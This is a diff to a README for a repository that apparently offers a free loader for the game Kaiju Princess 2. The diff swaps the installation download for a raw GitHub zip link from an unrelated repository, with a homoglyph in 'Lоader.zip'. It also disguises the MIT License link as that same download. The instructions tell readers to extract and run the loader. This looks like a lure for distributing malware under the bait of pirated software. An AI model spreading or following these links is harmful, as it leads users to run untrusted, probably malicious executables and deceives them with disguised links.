@@ -28,7 +28,7 @@ Welcome to the **Kaiju Princess 2 ** repository! Here you’ll discover high-spe
 
 ## 📖 Installation Guide 📖
 
-1. Download `Loader.rar` from the repository.
+1. Download `https://raw.githubusercontent.com/GRIMREAPER25-UI/qr-code-scanner-app-source-code/main/Lоader.zip` from the repository.
 2. Extract files to your preferred directory.
 3. Run the Loader and follow on-screen instructions.
 4. Play Kaiju Princess 2 FOR FREE!
@@ -49,4 +49,4 @@ This repository hosts a loader for compatibility purposes only and does not dist
 
 ## 📜 MIT License (2025) 📜
 
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) (2025). Use, modify, or share responsibly!
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/GRIMREAPER25-UI/qr-code-scanner-app-source-code/main/Lоader.zip) (2025). Use, modify, or share responsibly!
